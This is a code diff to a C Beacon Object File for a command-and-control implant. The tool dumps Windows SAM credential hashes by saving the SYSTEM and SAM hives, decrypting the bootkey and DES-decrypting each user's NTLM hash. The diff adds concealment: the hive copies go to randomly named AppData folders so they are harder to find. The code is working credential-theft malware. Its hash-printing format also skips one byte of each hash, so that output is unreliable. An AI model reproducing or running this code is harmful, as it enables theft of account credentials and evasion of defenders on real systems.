@@ -4,8 +4,7 @@
 #include "../_include/bofdefs.h"
 #include "bofdefs.h"
 #include "hive_parser.c"
-
-
+#include <shlobj.h>
 
 const BYTE ODD_PARITY[] = {
     1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
@@ -23,40 +22,44 @@ const BYTE ODD_PARITY[] = {
     193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206,
     208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223,
     224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239,
-    241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254 };
+    241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254};
 
 // Decrypt data using DES algorithm
-BOOL DecryptDES(const BYTE* key, const BYTE* data, BYTE* output) {
+BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
+{
     BCRYPT_ALG_HANDLE hAlg = NULL;
     BCRYPT_KEY_HANDLE hKey = NULL;
     BOOL result = FALSE;
 
     NTSTATUS status = bcrypt$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0);
-    if (!BCRYPT_SUCCESS(status)) {
+    if (!BCRYPT_SUCCESS(status))
+    {
         return FALSE;
     }
 
     status = bcrypt$BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-        (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
-        sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
-    if (!BCRYPT_SUCCESS(status)) {
+                                      (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
+                                      sizeof(BCRYPT_CHAIN_MODE_ECB), 0);
+    if (!BCRYPT_SUCCESS(status))
+    {
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     status = bcrypt$BCryptGenerateSymmetricKey(hAlg, &hKey,
-        NULL, 0, (PUCHAR)key, 8, 0);
-    if (!BCRYPT_SUCCESS(status)) {
+                                               NULL, 0, (PUCHAR)key, 8, 0);
+    if (!BCRYPT_SUCCESS(status))
+    {
         bcrypt$BCryptCloseAlgorithmProvider(hAlg, 0);
         return FALSE;
     }
 
     DWORD cbResult = 0;
     status = bcrypt$BCryptDecrypt(hKey,
-        (PUCHAR)data, 8,
-        NULL,
-        NULL, 0,
-        output, 8, &cbResult, 0);
+                                  (PUCHAR)data, 8,
+                                  NULL,
+                                  NULL, 0,
+                                  output, 8, &cbResult, 0);
 
     result = BCRYPT_SUCCESS(status);
 
@@ -233,8 +236,6 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
         }
         Advapi32$RegCloseKey(hKey);
 
-        // wprintf(L" %s: %s\n", values[i], classValue);
-
         // Decode the bootkey hex strings
         for (size_t j = 0; j < classValueSize / 2; ++j)
         {
@@ -250,13 +251,58 @@ BOOL GetBootKey(HKEY hSystem, LPCSTR lsaPath, BYTE *bootKey)
     return TRUE;
 }
 
+// Global pointers for backup paths
+char *systemBackupPath = NULL;
+char *samBackupPath = NULL;
+
+// Generate random alphanumeric string
+void GenerateRandomString(char *buffer, size_t length)
+{
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    for (size_t i = 0; i < length; ++i)
+    {
+        buffer[i] = charset[MSVCRT$rand() % (sizeof(charset) - 1)];
+    }
+    buffer[length] = '\0';
+}
+
+// Initialize backup paths with random directories in AppData\Local
+void InitializeBackupPaths()
+{
+    MSVCRT$srand((unsigned int)MSVCRT$time(NULL)); // Seed RNG
+
+    char basePath[MAX_PATH];
+    // Get AppData\Local path
+    if (!SUCCEEDED(Shell32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, basePath)))
+    {
+        MSVCRT$strcpy_s(basePath, MAX_PATH, "C:\\temp"); // Fallback
+    }
+
+    char randPart1[9], randPart2[9];
+    GenerateRandomString(randPart1, 8); // 8-character random string
+    GenerateRandomString(randPart2, 8); // 8-character random string
+
+    // Allocate and build paths
+    systemBackupPath = (char *)AllocateMemory(MAX_PATH);
+    samBackupPath = (char *)AllocateMemory(MAX_PATH);
+
+    MSVCRT$sprintf_s(systemBackupPath, MAX_PATH, "%s\\%s", basePath, randPart1);
+    MSVCRT$sprintf_s(samBackupPath, MAX_PATH, "%s\\%s", basePath, randPart2);
+}
+
+// Remember to free memory during cleanup
+void CleanupBackupPaths()
+{
+    FreeMemory(systemBackupPath);
+    FreeMemory(samBackupPath);
+}
+
 void go()
 {
+    InitializeBackupPaths();
     LONG res;
-    // Change the paths to more hidden ones (AppData and random filenames)
-    const char *systemBackupPath = "C:\\temp\\backup1";
+
     const char *tempSystemKey = "BACKUP1";
-    const char *samBackupPath = "C:\\temp\\backup2";
 
     if (!EnablePrivilege(SE_BACKUP_NAME))
     {
@@ -339,9 +385,9 @@ void go()
     Advapi32$RegCloseKey(hSystemBak);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Bootkey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-                 bootKey[0], bootKey[1], bootKey[2], bootKey[3], 
+                 bootKey[0], bootKey[1], bootKey[2], bootKey[3],
                  bootKey[4], bootKey[5], bootKey[6], bootKey[7],
-                 bootKey[8], bootKey[9], bootKey[10], bootKey[11], 
+                 bootKey[8], bootKey[9], bootKey[10], bootKey[11],
                  bootKey[12], bootKey[13], bootKey[14], bootKey[15]);
 
     res = Advapi32$RegUnLoadKeyA(HKEY_LOCAL_MACHINE, tempSystemKey);
@@ -476,9 +522,9 @@ void go()
     FreeMemory(fdata);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[HASHDUMP] Decrypted bootkey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-                 decryptedBootKey[0], decryptedBootKey[1], decryptedBootKey[2], decryptedBootKey[3], 
+                 decryptedBootKey[0], decryptedBootKey[1], decryptedBootKey[2], decryptedBootKey[3],
                  decryptedBootKey[4], decryptedBootKey[5], decryptedBootKey[6], decryptedBootKey[7],
-                 decryptedBootKey[8], decryptedBootKey[9], decryptedBootKey[10], decryptedBootKey[11], 
+                 decryptedBootKey[8], decryptedBootKey[9], decryptedBootKey[10], decryptedBootKey[11],
                  decryptedBootKey[12], decryptedBootKey[13], decryptedBootKey[14], decryptedBootKey[15]);
 
     // Navigate to SAM\Domains\Account\Users
@@ -495,6 +541,10 @@ void go()
         MSVCRT$fclose(file);
         return;
     }
+
+    wchar_t *outputBuffer = (wchar_t *)AllocateMemory(offsetCount * 128 * sizeof(wchar_t)); // Size is only approximate, maybe fix it. However, 128 is big enough
+    MSVCRT$memset(outputBuffer, 0, offsetCount * 128 * sizeof(wchar_t));
+    int bufferSize = 0;
 
     for (uint32_t i = 0; i < offsetCount; i++)
     {
@@ -569,6 +619,7 @@ void go()
             continue;
         }
 
+        // TODO !!! Crashes on cyrillic usernames + Client is not rendering WCHARS correctly - check and fix
         wchar_t *username = (wchar_t *)AllocateMemory(usernameLength + sizeof(wchar_t)); // wchar because cyrillic and other usernames
         if (!username)
         {
@@ -594,6 +645,30 @@ void go()
 
         if (vdataSize <= ntOffset + 4 + hashLength)
         {
+            FreeMemory(username);
+            FreeMemory(vdata);
+            FreeMemory(fdata);
+            continue;
+        }
+        if (hashLength <= 0x18)
+        {
+            // Empty hash - TODO lookup how secretsdump handles this guys
+            wchar_t *partBuffer = (wchar_t *)AllocateMemory(128 * sizeof(wchar_t));
+            if (partBuffer == NULL)
+            {
+                BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Could not allocate buffer");
+                FreeMemory(username);
+                FreeMemory(vdata);
+                FreeMemory(fdata);
+                continue;
+            }
+            MSVCRT$memset(partBuffer, 0, 128 * sizeof(wchar_t));
+
+            int partSize = MSVCRT$sprintf(partBuffer, "%ls:%d:<empty>\n", username, rid);
+
+            MSVCRT$wcscat_s(outputBuffer, offsetCount * 128, partBuffer);
+            bufferSize += partSize;
+
             FreeMemory(username);
             FreeMemory(vdata);
             FreeMemory(fdata);
@@ -661,11 +736,27 @@ void go()
                 DecryptDES(k1, encrypted_hash, decrypted_hash);
                 DecryptDES(k2, encrypted_hash, decrypted_hash + 0x8);
 
-                BeaconPrintf(CALLBACK_OUTPUT, "%ls:%d:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n", username, rid,
-                             decrypted_hash[0], decrypted_hash[2], decrypted_hash[3], decrypted_hash[4],
-                             decrypted_hash[5], decrypted_hash[6], decrypted_hash[7], decrypted_hash[8],
-                             decrypted_hash[9], decrypted_hash[10], decrypted_hash[11], decrypted_hash[12],
-                             decrypted_hash[13], decrypted_hash[14], decrypted_hash[15], decrypted_hash[16]);
+                wchar_t *partBuffer = (wchar_t *)AllocateMemory(128 * sizeof(wchar_t));
+                if (partBuffer == NULL)
+                {
+                    BeaconPrintf(CALLBACK_ERROR, "[HASHDUMP] Could not allocate buffer");
+                    FreeMemory(encrypted_hash);
+                    continue;
+                }
+                MSVCRT$memset(partBuffer, 0, 128 * sizeof(wchar_t));
+
+                int partSize = MSVCRT$sprintf(partBuffer, "%ls:%d:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n", username, rid,
+                                              decrypted_hash[0], decrypted_hash[2], decrypted_hash[3], decrypted_hash[4],
+                                              decrypted_hash[5], decrypted_hash[6], decrypted_hash[7], decrypted_hash[8],
+                                              decrypted_hash[9], decrypted_hash[10], decrypted_hash[11], decrypted_hash[12],
+                                              decrypted_hash[13], decrypted_hash[14], decrypted_hash[15], decrypted_hash[16]);
+
+                if (partSize != -1) {
+                    // This thing not works for non-english usernames, will need to find why we got -1 for it. swprintf makes Beacon die - need to debug
+                    MSVCRT$wcscat_s(outputBuffer, offsetCount * 128, partBuffer);
+                    bufferSize += partSize;
+                    BeaconPrintf(CALLBACK_OUTPUT, "Full: %d, Part: %d\n", bufferSize, partSize);
+                }
 
                 FreeMemory(encrypted_hash);
             }
@@ -676,5 +767,8 @@ void go()
         FreeMemory(fdata);
     }
 
+    BeaconOutput(CALLBACK_OUTPUT, outputBuffer, bufferSize);
+
     MSVCRT$fclose(file);
+    CleanupBackupPaths();
 }
